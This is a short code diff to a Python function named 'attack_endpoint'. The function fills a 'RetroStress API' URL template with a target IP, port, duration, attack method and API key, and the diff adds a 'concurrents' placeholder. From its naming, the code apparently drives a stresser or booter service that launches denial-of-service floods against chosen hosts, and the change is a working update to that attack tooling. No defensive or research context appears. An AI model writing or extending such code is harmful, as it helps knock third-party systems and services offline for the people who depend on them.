@@ -394,14 +394,14 @@ def attack_endpoint():
             # Call RetroStress API
             url = RETROSTRESS_API_URL
             
-            # Check if URL is a template with placeholders
-            if "[target]" in url or "[port]" in url or "[time]" in url or "[key]" in url:
+            if "[target]" in url or "[port]" in url or "[time]" in url or "[key]" in url or "[concurrents]" in url:
                 log("ℹ️ URL appears to be a template. Replacing placeholders.")
                 url = url.replace("[target]", ip)\
                          .replace("[port]", str(port))\
                          .replace("[time]", str(duration))\
                          .replace("[method]", method)\
-                         .replace("[key]", RETROSTRESS_API_KEY if RETROSTRESS_API_KEY else "")
+                         .replace("[key]", RETROSTRESS_API_KEY if RETROSTRESS_API_KEY else "")\
+                         .replace("[concurrents]", "1")
                 
                 # Fallback for common patterns
                 if "key=0" in url and RETROSTRESS_API_KEY:
